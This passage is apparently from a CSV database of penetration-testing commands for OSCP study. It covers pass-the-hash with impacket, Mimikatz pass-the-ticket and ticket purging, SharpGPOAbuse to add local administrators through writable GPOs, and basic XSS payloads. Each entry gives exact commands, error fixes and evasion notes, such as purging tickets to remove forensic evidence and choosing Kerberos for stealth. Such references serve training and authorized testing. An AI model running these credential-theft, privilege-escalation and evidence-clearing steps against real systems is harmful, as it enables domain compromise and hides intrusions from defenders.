TIME ESTIMATE: 5-10 seconds connection, 1-3 seconds per command execution","high","","","","{""STATUS_LOGON_FAILURE"": ""Hash, username, or domain incorrect. VERIFY: (1) NTLM hash is exactly 32 hex characters (check with: echo <HASH> | wc -c, should output 33 including newline). (2) Username matches AD account (check: net user <USERNAME> /domain). (3) Domain is NetBIOS or FQDN (verify: echo %USERDNSDOMAIN%). TEST: Use crackmapexec first to validate credentials: crackmapexec smb <TARGET> -u <USER> -H <HASH> -d <DOMAIN>."", ""STATUS_ACCESS_DENIED (authenticated but failed)"": ""User credentials are VALID but lacks privileges for WMI execution. REQUIRED: Local Administrators OR DCOM Users group membership. VERIFY: (1) Test with CME: crackmapexec smb <TARGET> -u <USER> -H <HASH> (should show 'Pwn3d!'). (2) Check group membership: net user <USERNAME> /domain | findstr 'Local Group'. SOLUTION: If user is admin on OTHER systems, pivot there first. Or escalate privileges on target."", ""DCERPC Runtime Error: rpc_s_access_denied"": ""WMI/DCOM permissions issue. CAUSES: (1) User not in Administrators or DCOM Users group (verify with whoami /groups). (2) WMI namespace permissions restricted by GPO (rare). (3) DCOM authentication level too high (registry: HKLM\\Software\\Microsoft\\Ole\\LegacyAuthenticationLevel). ALTERNATIVES: If WMI blocked, try psexec: impacket-psexec -hashes :<HASH> <DOMAIN>/<USER>@<TARGET>. Or smbexec: impacket-smbexec -hashes :<HASH> <DOMAIN>/<USER>@<TARGET>."", ""Connection refused on port 135"": ""RPC Endpoint Mapper (port 135) is blocked by firewall OR WMI service disabled. VERIFY: (1) Port scan: sudo nmap -p 135,445 -Pn <TARGET>. Port 135 should show 'open'. (2) WMI service status (if you have shell): sc query winmgmt. ALTERNATIVES: Use psexec (only needs port 445): impacket-psexec -hashes :<HASH> <DOMAIN>/<USER>@<TARGET>. Or if WinRM enabled: evil-winrm -i <TARGET> -u <USER> -H <HASH>.""}","{""impacket-wmiexec"": ""Impacket tool for remote command execution via Windows Management Instrumentation (WMI). Uses DCOM (Distributed COM) to invoke WMI methods for process creation. ADVANTAGES over psexec: (1) No binaries written to disk (fileless execution), (2) No service creation (Event ID 7045 not generated), (3) Works when ADMIN$ is blocked. DISADVANTAGES: (1) Requires WMI/DCOM ports (135 + dynamic high ports), (2) Semi-interactive shell (slower than psexec), (3) Logged in WMI event logs (Event ID 4648, 4624 Type 3)."", ""-hashes :<NTLM_HASH>"": ""Pass-the-Hash authentication. Colon prefix indicates empty LM hash (modern Windows standard). Full format: -hashes LM:NTLM. For modern systems: -hashes :NTLM (LM portion is aad3b435b51404eeaad3b435b51404ee constant). Extract NTLM hash from: (1) DCSync output (second hash in krbtgt:502:LM:NTLM::: format), (2) SAM dump, (3) LSASS memory dump, (4) Hashcat potfile after cracking (if you need plaintext)."", ""<DOMAIN>/<USERNAME>"": ""Authentication credentials. Domain: NetBIOS name ('CORP') or FQDN ('corp.com'). For local accounts: Use '.' as domain OR computer name. Username: Must have local administrator OR 'DCOM Users' group membership. Combined format: corp.com/dave OR .\\Administrator (local admin). Case-insensitive but must match exact account name."", ""@<TARGET>"": ""Target system IP or hostname. IP: 192.168.50.75 (fast, works with NTLM). FQDN: CLIENT75.corp.com (required for Kerberos). For domain controllers, PREFER FQDN to enable Kerberos authentication (stealthier than NTLM). Check DNS resolution: nslookup <FQDN>. If DNS fails, use -target-ip flag: impacket-wmiexec -target-ip <IP> <DOMAIN>/<USER>@<FQDN>.""}","","[""ad-pass-the-hash-impacket-psexec"", ""ad-pass-the-hash-crackmapexec""]","[""ad-lsass-dump-procdump"", ""ad-sam-dump-reg-save"", ""windows-search-sensitive-files""]"
"mimikatz-kerberos-ptt","Mimikatz Pass-the-Ticket (Inject Ticket)","post-exploit",".\mimikatz.exe ""kerberos::ptt <TICKET_FILE>"" ""exit""","Inject Kerberos ticket (.kirbi file) into current Windows session for Pass-the-Ticket attack. Enables authentication using stolen or forged tickets without knowing passwords or hashes. Works with TGT (domain-wide access) and TGS (service-specific access).","kerberos-attacks",".\mimikatz.exe ""kerberos::ptt admin.kirbi"" ""exit""","OSCP METHODOLOGY: Pass-the-Ticket is essential for lateral movement when you have tickets but not passwords. COMMON SCENARIO: You dump credentials from workstation, find TGT for Domain Admin who logged in earlier. Inject that TGT and gain DA access without cracking passwords.

TIME ESTIMATE: 10-30 seconds (5 sec inject ticket, 5 sec verify with klist, 10-20 sec test access)

MANUAL ALTERNATIVES:
1. Rubeus: Rubeus.exe ptt /ticket:admin.kirbi (C# alternative, same functionality)
2. Impacket (Linux): Export KRB5CCNAME=admin.ccache environment variable, then use impacket tools
3. PowerShell: Not directly supported - use Rubeus or Mimikatz

KERBEROS VS NTLM:
- Kerberos: Mutual authentication, ticket-based, supports delegation
- NTLM: Challenge-response, hash-based, works with IPs
- Force Kerberos: Use FQDN hostnames (DC1.corp.com) NOT IPs (192.168.1.10)
- Fallback: If Kerberos fails, Windows tries NTLM (unless disabled)

TICKET TYPES:
- TGT (krbtgt service): 10-hour default lifetime, grants access to ANY service
- TGS (specific service): Varies by service, grants access to ONE service
- Forged tickets: Golden (TGT) and Silver (TGS) can have arbitrary lifetimes

OSCP EXAM TIPS:
1. ALWAYS verify ticket injection with klist immediately after ptt
2. Test access with simple command: dir \\DC1\C$ or net use \\DC1\IPC$
3. Use TGT when available (more flexible than service-specific TGS)
4. Purge tickets (kerberos::purge) before injecting to avoid conflicts
5. Document ticket source: exported from USER on SYSTEM at TIME
6. Tickets work from ANY Windows system in domain (not tied to specific machine)

DETECTION NOTES:
- Event ID 4768: TGT request (normal Kerberos traffic)
- Event ID 4769: TGS request (also normal)
- Event ID 4624: Successful logon (Type 3 = Network logon from ticket use)
- Low detection risk: Ticket reuse looks identical to legitimate authentication
- Stealth advantage: No password spray, no failed logins, no unusual protocols

COMMON MISTAKES:
1. Using IP addresses (forces NTLM, not Kerberos) - use hostnames
2. Not verifying ticket expiration before injection
3. Forgetting to purge existing tickets causing conflicts
4. Mixing tickets from different domains
5. Not testing access immediately after injection

ADVANCED USAGE:
- Inject into specific session: kerberos::ptt /luid:0x3e7 admin.kirbi (requires SeDebugPrivilege)
- Inject multiple tickets: kerberos::ptt *.kirbi (wildcards supported)
- Cross-forest tickets: Requires trust relationship between forests","high","","","","{""Ticket injection OK but access denied"": ""Possible causes: (1) Ticket is for wrong service (e.g., injected http/SERVER but trying to access cifs/SERVER). Solution: Verify service principal matches - use TGT for universal access or correct TGS. (2) Ticket expired. Solution: Check 'klist' end time. (3) Target validates tickets at KDC (PAC validation). Solution: Use freshly forged Golden/Silver ticket. (4) Using IP instead of hostname. Solution: Use fully qualified hostname to force Kerberos (IPs use NTLM fallback)."", ""ERROR 0x00000520 (Unknown format)"": ""Ticket file is corrupted or wrong format. Solution: Verify .kirbi file integrity - should start with binary data, ~1-5KB size. If converting from ccache: impacket-ticketConverter ticket.ccache ticket.kirbi. If from Rubeus: Rubeus.exe dump /service:krbtgt /nowrap /outfile:ticket.kirbi. Test file with: kerberos::list /export (should parse without errors)."", ""Ticket not appearing in klist"": ""Injection succeeded but ticket not visible. Causes: (1) Injected into different LUID. Solution: Verify current session LUID with 'klist' - look for 'Current LogonId is 0:0x<HEX>'. (2) Ticket immediately purged by system policy. Solution: Check GPO for ticket lifetime restrictions. (3) Using 'klist purge' cleared cache. Solution: Re-inject ticket."", ""Multiple tickets conflicting"": ""Injecting second TGT overwrites first. Solution: Use kerberos::purge BEFORE injection to clear existing tickets, ensuring clean state. Or use specific LUID: kerberos::ptt /luid:0x123456 ticket.kirbi to inject into specific session without affecting current.""}","{""kerberos::ptt"": ""Pass-the-Ticket module that injects Kerberos tickets into the current Windows logon session (LUID - Logon ID). WHY THIS WORKS: Windows stores Kerberos tickets in memory associated with each user session. By injecting a ticket, you add it to the ticket cache, allowing the current process to authenticate as the ticket's user. This bypasses the need for passwords or NTLM hashes. CRITICAL: Ticket must match the target service or be a TGT for domain-wide access. Unlike sekurlsa module, kerberos::ptt does NOT require SeDebugPrivilege - it uses standard Kerberos APIs accessible to any user."", ""<TICKET_FILE>"": ""Path to Base64-encoded .kirbi file containing the Kerberos ticket. Format: [LogonID]-[TicketType]-[Flags]-[KeyType]-user@service-DOMAIN.kirbi. Supports wildcards: 'kerberos::ptt *.kirbi' injects all tickets in current directory. WHY .KIRBI: Mimikatz proprietary format for Kerberos tickets (binary structure). Convert from ccache: impacket-ticketConverter ticket.ccache ticket.kirbi. File contains: service principal name, session key, ticket lifetime, authorization data, and encrypted TGS/TGT."", ""Ticket Types"": ""TGT (Type 2) = Ticket Granting Ticket - encrypted with krbtgt hash, used to request TGS for ANY service. Most valuable for Pass-the-Ticket attacks. TGS (Type 0) = Service Ticket - encrypted with service account hash, grants access to ONE specific service only (e.g., cifs/DC1 for SMB, http/WEB01 for HTTP). Injecting TGT provides domain-wide access, TGS provides single-service access."", ""LUID Context"": ""Pass-the-Ticket injects into CURRENT logon session only. Each Windows session (console, RDP, service) has unique LUID. Ticket injected in RDP session won't work in console session. Use 'kerberos::ptt /luid:0x<LUID_HEX> <ticket>' to inject into specific session (requires SeDebugPrivilege). For exam: inject ticket, then use same session for lateral movement commands.""}","","[""kerberos-rubeus-ptt""]","[""mimikatz-kerberos-list"", ""windows-smb-access-test"", ""windows-psexec-lateral-movement""]"
"mimikatz-kerberos-list","Mimikatz List Kerberos Tickets","enumeration",".\mimikatz.exe ""kerberos::list"" ""exit""","List all Kerberos tickets cached in current Windows session with detailed metadata. Alternative to Windows klist command with enhanced information (encryption types, flags, session keys). Essential for verifying Pass-the-Ticket injection and identifying high-value tickets for lateral movement.","kerberos-attacks","","OSCP METHODOLOGY: Use kerberos::list to verify Pass-the-Ticket injection success and identify available tickets for lateral movement. IMMEDIATE USE CASE: After injecting Golden Ticket, run kerberos::list to confirm TGT appears in cache with correct user and domain.

TIME ESTIMATE: 5-10 seconds (instant execution, 5-10 sec to analyze output)

MANUAL ALTERNATIVES:
1. Windows klist: Built-in command, shows basic ticket info (client, server, times). Less detail than Mimikatz.
2. Rubeus.exe triage: Lists tickets with additional metadata, similar to Mimikatz kerberos::list.
3. PowerShell: Get-WinEvent -LogName Security -FilterXPath ""*[System[EventID=4768 or EventID=4769]]"" (shows ticket requests from event logs, not cache)

KLIST VS KERBEROS::LIST:
Windows klist:
  - Pros: Built-in, no tools needed, fast
  - Cons: Limited metadata, no encryption details, no session keys
  - Output: Basic (client, server, start/end times)
Mimikatz kerberos::list:
  - Pros: Full ticket metadata, encryption types, flags, session keys
  - Cons: Requires Mimikatz upload
  - Output: Comprehensive (everything klist shows + encryption, keys, PAC data)

OSCP EXAM TIPS:
1. Run IMMEDIATELY after Pass-the-Ticket injection to verify success
2. Look for 'Server Name: krbtgt' = TGT (domain-wide access)
3. Check 'End Time' to ensure ticket hasn't expired before lateral movement
4. Identify which tickets are TGT vs TGS by service name (krbtgt = TGT, others = TGS)
5. Document all tickets found: Client, Server, Encryption, Expiration
6. Compare before/after ticket purge to verify cleanup

TICKET ANALYSIS:
- Forwardable flag (0x40000000): Ticket can be used for delegation (pass to other systems)
- Renewable flag (0x00800000): Can be renewed beyond End Time up to MaxRenew time
- Initial flag (0x00400000): Ticket obtained via AS-REQ (initial authentication), not TGS-REQ
- Pre-authent flag (0x00200000): Kerberos pre-authentication was required (prevents AS-REP roasting)

ENCRYPTION INTERPRETATION:
- Environment with AES256: Modern, secure domain (2008 R2+)
- Mix of RC4 and AES: Transitional environment, legacy systems present
- RC4 only: Older domain (<2008) or security settings weakened for compatibility
- Forged tickets should match domain's encryption standard to blend in

DETECTION NOTES:
- Querying own ticket cache is normal user activity (Event ID 4768/4769)
- No special privileges required, no suspicious events generated
- Mimikatz process execution may trigger AV (focus is on the binary, not the action)
- Very low detection risk for this specific command

COMMON USE CASES:
1. Verify Pass-the-Ticket injection: kerberos::ptt ticket.kirbi && kerberos::list
2. Identify ticket expiration before lateral movement
3. Confirm ticket encryption type matches domain policy
4. Compare tickets before/after purge for cleanup verification
5. Debug Kerberos authentication failures (missing or wrong tickets)

TROUBLESHOOTING AUTHENTICATION:
If kerberos::list shows ticket but access denied:
- Wrong service principal: Need cifs/SERVER for SMB, http/SERVER for HTTP
- IP vs hostname: Using IP forces NTLM (Kerberos requires hostname)
- Expired ticket: Check End Time has not passed
- PAC validation: Some services validate ticket at KDC (Golden/Silver tickets may fail)","medium","","","","{""No tickets displayed"": ""Ticket cache is empty. Causes: (1) Recently ran 'klist purge' or 'mimikatz kerberos::purge'. Solution: Normal - obtain new tickets by accessing resources: dir \\\\DC1\\SYSVOL (requests TGT automatically). (2) User logged on with NTLM only (not Kerberos). Solution: Access service by FQDN to force Kerberos. (3) Kerberos disabled via GPO. Solution: Unusual - verify with: gpresult /h gp.html, check 'Network security: Configure encryption types allowed for Kerberos'."", ""ERROR LsaCallKerberosPackage"": ""Kerberos Security Support Provider (SSP) not loaded or malfunctioning. Solution: Extremely rare - indicates system corruption or heavily restricted environment. Alternative: Use Windows native 'klist' command instead. Verify Kerberos service status: sc query kdc (on DC) or check network authentication: netsh advfirewall show allprofiles."", ""Tickets shown but can't access resources"": ""Tickets exist but incorrect service principal or expired. Diagnosis steps: (1) Check End Time - if in past, tickets expired. (2) Verify Service Name matches target - 'cifs/DC1' works for \\\\DC1\\C$, but NOT for HTTP access. (3) Check Client name - ensure it's a privileged account. Solution: Inject correct ticket (kerberos::ptt) or request new ticket by accessing service.""}","{""kerberos::list"": ""Enumerate all Kerberos tickets in the current logon session's ticket cache. WHY MORE DETAILED THAN KLIST: Mimikatz displays additional metadata including encryption type (RC4, AES128, AES256), ticket flags (forwardable, renewable, proxiable), authorization data (PAC - Privilege Attribute Certificate), and session keys. This information is critical for understanding ticket capabilities and identifying Golden/Silver tickets. DOES NOT REQUIRE SEDEBUGPRIVILEGE: Uses standard Kerberos SSP (Security Support Provider) APIs accessible to any user for their own session."", ""Ticket Cache"": ""Windows stores Kerberos tickets in-memory associated with each logon session (LUID). Cache includes: TGT (for requesting service tickets), TGS tickets (for accessing specific services), and renewal tickets. Tickets persist until expiration, logoff, or manual purge. CRITICAL: Tickets in cache are automatically used for authentication when accessing Kerberos-enabled services (SMB, HTTP, LDAP)."", ""Output Fields"": ""Key fields displayed: (1) Start Time / End Time: Ticket validity period (default TGT lifetime = 10 hours). (2) Service Name: krbtgt/<DOMAIN> for TGT, cifs/<SERVER> for SMB TGS, http/<SERVER> for HTTP TGS, etc. (3) Client: User@DOMAIN who owns the ticket. (4) Flags: 40e10000 = forwardable + renewable + initial. (5) Encryption: 0x12 = AES256, 0x11 = AES128, 0x17 = RC4 (older, weaker). (6) Ticket: Base64-encoded ticket data (can be extracted and saved)."", ""Encryption Types"": ""0x17 (23) = RC4_HMAC_MD5 - Legacy encryption, faster cracking, common in pre-2012 domains. 0x11 (17) = AES128_CTS_HMAC_SHA1_96 - Modern encryption, stronger than RC4. 0x12 (18) = AES256_CTS_HMAC_SHA1_96 - Strongest encryption, default for Windows 2008 R2+. WHY IT MATTERS: Forged Golden/Silver tickets with RC4 may be suspicious in AES-only environments. Match encryption to domain security level.""}","","","[""mimikatz-kerberos-ptt"", ""mimikatz-kerberos-purge""]"
"mimikatz-kerberos-purge","Mimikatz Purge Kerberos Tickets","utilities",".\mimikatz.exe ""kerberos::purge"" ""exit""","Remove all Kerberos tickets from current Windows session cache. Essential for cleanup after Pass-the-Ticket attacks, avoiding ticket conflicts, and resetting Kerberos authentication state. Equivalent to Windows 'klist purge' but integrated into Mimikatz workflows.","kerberos-attacks","","OSCP METHODOLOGY: Use kerberos::purge for cleanup and ticket conflict resolution. CRITICAL FOR OPSEC: After completing lateral movement with Pass-the-Ticket, purge tickets to remove evidence from memory. Note: Event logs still record ticket usage, but in-memory tickets are cleared.

TIME ESTIMATE: 5 seconds (instant execution, verify with klist)

MANUAL ALTERNATIVES:
1. Windows klist purge: Built-in command, same functionality. Syntax: klist purge (purges current session) or klist purge /luid:0x<LUID> (specific session).
2. Logoff and logon: Nuclear option - clears all tickets by terminating session. Not recommended during active attack.
3. Reboot: Clears ALL tickets for ALL sessions. Not practical during exam.

OSCP EXAM TIPS:
1. Purge BEFORE injecting new ticket to avoid conflicts (old TGT vs new injected TGT)
2. Purge AFTER completing lateral movement for cleanup
3. Verify purge success with: kerberos::list (should show empty or minimal tickets)
4. Document in report: Purged tickets on SYSTEM at TIME for cleanup
5. Not always necessary - tickets expire naturally (10 hours default)
6. Useful when switching between different user tickets (DA  local admin  service account)

WHEN TO PURGE:
PURGE BEFORE INJECTION:
- Scenario: Workstation has existing TGT for current user. Want to inject DA TGT from different user.
- Problem: Multiple TGTs can conflict, causing authentication failures.
- Solution: kerberos::purge && kerberos::ptt da.kirbi

PURGE AFTER ATTACK:
- Scenario: Used Pass-the-Ticket for lateral movement, now disconnecting.
- Problem: Injected tickets remain in memory as forensic evidence.
- Solution: kerberos::purge before ending session (removes in-memory evidence)

DON'T PURGE:
- Scenario: Normal domain user, accessing resources legitimately.
- Reason: Tickets regenerate automatically, no operational benefit.
- Exception: Testing Kerberos authentication flow (force re-auth)

TICKET REGENERATION:
After purge, tickets automatically regenerate when accessing Kerberos services:
1. User accesses \\DC1\SYSVOL
2. Windows requests TGT from KDC (AS-REQ)  Event ID 4768
3. KDC validates credentials, issues TGT (AS-REP)
4. Windows requests TGS for cifs/DC1 (TGS-REQ)  Event ID 4769
5. KDC issues service ticket (TGS-REP)
6. Authentication succeeds, tickets cached

DETECTION NOTES:
- Purging tickets is normal administrative activity (no specific Event ID)
- Sudden ticket re-requests after purge visible in Event ID 4768/4769
- Pattern: Purge + immediate re-auth may indicate testing or attack
- Low suspicion: Users rarely manually purge tickets, but it's not inherently malicious

COMMON MISTAKES:
1. Purging tickets in wrong session (console vs RDP) - verify LUID first
2. Purging before verifying injected ticket works - test access BEFORE cleanup
3. Assuming purge removes event log evidence - logs persist, only memory cleared
4. Not verifying purge success with kerberos::list or klist
5. Purging tickets needed for ongoing operations - ensure attack complete first

ADVANCED USAGE:
- Purge specific LUID: kerberos::purge /luid:0x<LUID_HEX> (requires SeDebugPrivilege)
- Purge all LUIDs: Loop through sessions with sekurlsa module (admin required)
- Selective purge: Not supported - all tickets purged together

FORENSIC NOTES:
What purge DOES remove:
- In-memory ticket cache entries
- Session keys associated with tickets
- Authorization data (PAC)

What purge DOES NOT remove:
- Event log entries (Event ID 4768/4769/4624)
- LSA cached credentials (different from Kerberos tickets)
- NTLM hashes in LSASS memory
- SAM/LSA Secrets on disk","medium","","","","{""Tickets still present after purge"": ""Purge command failed to execute properly. Causes: (1) Tickets belong to different LUID (logon session). Solution: Verify current LUID with 'klist' - 'Current LogonId is 0:0x<HEX>'. Each RDP/console session has separate LUID. (2) System automatically re-requested tickets. Solution: Normal behavior - accessing network resource immediately after purge triggers new TGT request. (3) Running purge in wrong session. Solution: Ensure Mimikatz runs in same session where tickets were injected."", ""ERROR LsaCallKerberosPackage"": ""Cannot communicate with Kerberos SSP. Solution: Extremely rare - indicates Kerberos subsystem failure. Alternative: Use Windows 'klist purge' command instead. Verify Kerberos service: sc query kdc (on DC) or check authentication: gpresult /r | findstr Kerberos."", ""Want to purge specific ticket (not all)"": ""Mimikatz kerberos::purge removes ALL tickets - no selective deletion. Solution: (1) Use Windows: klist purge /luid:0x<LUID> (purges specific LUID but still all tickets). (2) Alternative: Export specific tickets with kerberos::list /export, purge all, then re-inject only desired tickets with kerberos::ptt. (3) Best approach: Accept that purge clears everything - tickets automatically regenerate on access.""}","{""kerberos::purge"": ""Purge (delete) all Kerberos tickets from the current logon session's ticket cache. WHY NEEDED: (1) CLEANUP: Remove evidence of Pass-the-Ticket attacks after lateral movement. (2) RESET: Clear conflicting tickets before injecting new ones (e.g., injecting TGT when TGS already exists for same service). (3) FORCE RE-AUTHENTICATION: Clear cached tickets to force fresh Kerberos authentication (useful for testing). DOES NOT REQUIRE SEDEBUGPRIVILEGE: Uses standard Kerberos SSP APIs to modify current user's ticket cache only."", ""Ticket Cache Clearing"": ""Removes both TGT (Ticket Granting Ticket) and TGS (Service Ticket) entries from memory. After purge: (1) Next access to Kerberos service triggers automatic TGT request to KDC. (2) User must re-authenticate if accessing new services. (3) Cached tickets from Pass-the-Ticket are gone (cannot be recovered). DOES NOT LOG OUT USER: Session remains active, only Kerberos tickets cleared. Network authentication continues using NTLM if Kerberos unavailable."", ""OPSEC Considerations"": ""Purging tickets removes forensic evidence of Pass-the-Ticket attacks from memory. However: (1) Tickets are re-requested automatically on next access (generates Event ID 4768/4769). (2) Cannot purge tickets in OTHER sessions without SeDebugPrivilege. (3) Event logs still show historical ticket requests. Best practice: Purge AFTER completing lateral movement objectives, before disconnecting session.""}","","","[""mimikatz-kerberos-list"", ""mimikatz-kerberos-ptt""]"
"sharpgpoabuse-add-local-admin","SharpGPOAbuse - Add Local Administrator","active-directory",".\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USERNAME> --GPOName ""<GPO_NAME>""","Abuse writable GPO permissions to add a user to the local Administrators group on all machines where the GPO applies. Requires write access to the GPO (check with icacls on SYSVOL).","gpo-abuse","","GPO ABUSE CRITICAL PATH:
1. Identify writable GPO: icacls ""\\DOMAIN\SYSVOL\DOMAIN\Policies\*""
2. Look for (F) Full Control or (W) Write on your user
3. Default Domain Policy applies to ALL domain computers
4. After modification: gpupdate /force on target
5. CRITICAL: Must re-login to receive new admin token

OSCP RELEVANCE: HIGH
GPO abuse is a reliable privilege escalation in misconfigured AD environments. Check SYSVOL permissions on every AD engagement.

MANUAL ALTERNATIVE:
Modify GPO directly via Group Policy Management Console (GPMC) if GUI access available, or edit GptTmpl.inf in SYSVOL directly.

TIME ESTIMATE: 5-10 minutes (including GPO refresh)","high","","","","{""Access is denied"": ""User lacks write permission on GPO. Verify with: icacls \""\\\\DOMAIN\\SYSVOL\\DOMAIN\\Policies\\{GPO-GUID}\"". Look for (F) or (W) permissions on your user/group."", ""GPO not found"": ""GPO name case-sensitive and must match exactly. List GPOs with: Get-NetGPO | select displayname. Use quotes if name contains spaces."", ""Changes not taking effect"": ""GPO changes require refresh. Force with: gpupdate /force. Then MUST re-login to get new token with updated group membership."", ""Token not updated after gpupdate"": ""Windows tokens created at logon. Group membership changes don't affect current sessions. Exit and reconnect (evil-winrm, RDP, etc.) to receive new token.""}","{""--AddLocalAdmin"": ""Modifies GPO to add specified user to BUILTIN\\Administrators group via Restricted Groups or Group Policy Preferences. Effect applies when GPO refreshes on target machines (gpupdate /force or next refresh cycle ~90 minutes). WHY: Most direct privilege escalation - local admin grants full control of affected machines."", ""--UserAccount"": ""Target user account to elevate. Must be a valid domain account (domain\\user or just username if in same domain). WHY: Specify which account receives administrative privileges."", ""--GPOName"": ""Case-sensitive GPO display name. Must match exactly as shown in AD (quotes required if contains spaces). Use Get-NetGPO or icacls to find writable GPOs. WHY: Targets specific GPO - choose one that applies to high-value machines (DCs, servers).""}","[""icacls-sysvol-check""]","","[""gpupdate-force"", ""net-localgroup-administrators""]"
"icacls-sysvol-check","Check SYSVOL GPO Permissions","active-directory","icacls ""\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\*""","Enumerate ACL permissions on all GPO folders in SYSVOL to identify GPOs with write access for the current user. Essential first step for GPO abuse attacks.","gpo-abuse","","GPO PERMISSION LEGEND:
(F) = Full Control - can modify GPO (JACKPOT)
(W) = Write - can modify GPO
(M) = Modify - can modify GPO
(RX) = Read/Execute - read only
(OI) = Object Inherit - applies to files
(CI) = Container Inherit - applies to subfolders

DEFAULT GPO GUIDs:
{31B2F340-016D-11D2-945F-00C04FB984F9} = Default Domain Policy
{6AC1786C-016F-11D2-945F-00C04FB984F9} = Default Domain Controllers Policy

OSCP TIP: Default Domain Policy applies to ALL domain computers. Write access here = immediate path to Domain Admin.

TIME ESTIMATE: 1-2 minutes","high","","","","{""Access is denied"": ""User lacks read access to SYSVOL (unusual in most AD environments). Try authenticating first or check if SYSVOL share is accessible: dir \\\\DOMAIN\\SYSVOL"", ""Network path not found"": ""Domain name incorrect or DNS not resolving domain. Verify with: nslookup DOMAIN or ping DOMAIN. May need to specify DC IP directly."", ""No writable GPOs found"": ""All GPOs properly secured. Try alternative attacks: ACL abuse on user objects, Kerberoasting, AS-REP roasting.""}","{""icacls"": ""Windows built-in command to display or modify Access Control Lists (ACLs) on files/folders. WHY: Native tool, no upload required, works on any Windows system."", ""\\\\DOMAIN\\SYSVOL"": ""UNC path to domain SYSVOL share containing Group Policy Objects. SYSVOL is replicated to all DCs. WHY: GPO definitions stored here - writable GPO = privilege escalation path."", ""\\Policies\\*"": ""Wildcard to enumerate all GPO folders. Each GPO has a GUID folder (e.g., {31B2F340-016D-11D2-945F-00C04FB984F9}). WHY: Check all GPOs at once to find misconfigurations.""}","","[""get-netgpo"", ""powerview-get-netgpo""]","[""sharpgpoabuse-add-local-admin""]"
"gpupdate-force","Force GPO Update","active-directory","gpupdate /force","Force immediate refresh of Group Policy on the local machine. Required after GPO modifications to apply changes without waiting for the default 90-minute refresh cycle.","gpo-abuse","","CRITICAL POST-GPO MODIFICATION:
1. Run gpupdate /force to apply changes
2. MUST START NEW SESSION for token refresh
3. Group membership changes don't affect existing tokens
4. whoami /groups shows OLD groups until re-login
5. Verify with: net localgroup administrators

DEFAULT GPO REFRESH CYCLE:
- Computer policy: 90 minutes (+ random 0-30 min)
- Domain Controllers: 5 minutes
- /force bypasses the wait

TIME ESTIMATE: 30 seconds - 2 minutes","medium","","","","{""Policy update failed"": ""Check network connectivity to DC. Verify DNS resolution: nslookup DOMAIN. May need to specify DC IP in network settings."", ""Changes still not applied after gpupdate"": ""Some GPO settings require logoff/reboot. For group membership changes, MUST start a NEW SESSION to get updated access token."", ""Access token not updated"": ""Windows creates access tokens at logon. Group membership changes from GPO don't affect running sessions. Exit current shell (evil-winrm, RDP) and reconnect.""}","{""/force"": ""Reapplies ALL policy settings regardless of whether they have changed. Without /force, only changed settings are applied. WHY: Ensures GPO modifications take effect immediately. Critical after SharpGPOAbuse or manual GPO edits.""}","","","[""net-localgroup-administrators""]"
"net-localgroup-administrators","Verify Local Administrators Group","active-directory","net localgroup administrators","Display members of the local Administrators group. Use to verify successful GPO abuse or other privilege escalation techniques.","gpo-abuse","","TOKEN VS GROUP MEMBERSHIP:
- net localgroup administrators = actual group membership
- whoami /groups = YOUR current access token
- These can differ after GPO changes
- Token only updates on NEW session

VERIFICATION WORKFLOW:
1. net localgroup administrators  User listed?
2. If yes but whoami /groups missing Administrators:
3. Exit session completely
4. Reconnect (evil-winrm, RDP, etc.)
5. whoami /groups now shows BUILTIN\Administrators

TIME ESTIMATE: 10 seconds","medium","","","","{""User not in group after gpupdate"": ""Token not refreshed. MUST start new session (exit evil-winrm, reconnect). Current session retains old token."", ""User shows in group but whoami /groups doesn't show Administrators"": ""This is expected! whoami shows YOUR current token. Group membership and token membership are different until re-login.""}","{""net localgroup"": ""Windows built-in command to manage local groups. WHY: Quick verification of group membership without PowerShell."", ""administrators"": ""Built-in local Administrators group (BUILTIN\\Administrators). Members have full control over the local machine. WHY: Verify your user was added after GPO abuse.""}","","",""
"xss-test-svg-onload","XSS Test - SVG onload Event","web","<svg onload=alert(1)>","XSS test payload using SVG onload event handler, effective when script tags are filtered but HTML tags allowed","","","Use when:
Testing for XSS in contexts where <script> tags are filtered but HTML tags are allowed.

Works in:
All modern browsers.

Delivery:
Inject in URL parameters (?param=<svg onload=alert(1)>), form fields, or anywhere user input is reflected.

Expected result:
Browser alert() dialog.

AUTHORIZATION REQUIRED:
Only test on systems you own or have written permission to test.

Responsible disclosure:
Report findings to security team before public disclosure.","medium","","","","{""SVG tags stripped"": ""Try alternative event handlers: xss-test-img-onerror"", ""CSP blocks execution"": ""Check CSP headers: curl -I <URL> | grep -i content-security"", ""Payload encoded"": ""Test input sanitization bypass techniques""}","","","[""xss-test-body-onload"", ""xss-test-img-onerror"", ""xss-test-script-basic""]","[""xss-cookie-stealer"", ""xss-session-hijack-fetch""]"
"xss-test-body-onload","XSS Test - Body onload Event","web","<body onload=alert(1)>","XSS test payload using body onload event handler, effective when full HTML injection is possible","","","Use when:
Testing for XSS where full HTML structure can be injected (rare in modern apps).

Works in:
All browsers, but less reliable than event-based payloads due to existing <body> tags.

Delivery:
Primarily in contexts where entire HTML document can be controlled (e.g., stored XSS in page templates).

AUTHORIZATION REQUIRED:
Only test on authorized targets.

Note:
This payload is less practical than event handlers like SVG/IMG but useful for understanding HTML injection scope.","medium","","","","{""Body tag ignored"": ""Page may already have <body> tag, try: xss-test-img-onerror"", ""onload blocked"": ""CSP restricts inline event handlers, try external script injection"", ""Payload filtered"": ""Use obfuscation: <BoDy OnLoAd=alert(1)>""}","","","[""xss-test-svg-onload"", ""xss-test-img-onerror"", ""xss-test-script-basic""]","[""xss-cookie-stealer"", ""xss-session-hijack-fetch""]"
"xss-test-img-onerror","XSS Test - IMG onerror Event","web","<img src=x onerror=alert(1)>","XSS test payload using IMG tag with onerror event, one of the most reliable XSS vectors","","","Use when:
Most common XSS test payload, works in contexts where IMG tags are allowed.

Works in:
All browsers, highly reliable because invalid src triggers onerror immediately.

Delivery:
URL parameters (?search=<img src=x onerror=alert(1)>), form inputs, comment fields.

Expected result:
Immediate alert() when page renders.

ADVANTAGES:
Self-contained (no external resources), fires on load, bypasses many filters.

AUTHORIZATION:
Test only on systems you own or have written permission to test.","high","","","","{""Image loading blocks payload"": ""Use invalid src to trigger onerror: src=x or src=invalid.jpg"", ""onerror stripped"": ""Try alternative events: onload, onmouseover, onfocus"", ""CSP violation"": ""Check if CSP allows inline event handlers: curl -I <URL> | grep CSP""}","","","[""xss-test-svg-onload"", ""xss-test-body-onload"", ""xss-test-script-basic""]","[""xss-cookie-stealer"", ""xss-session-hijack-fetch"", ""xss-keylogger""]"
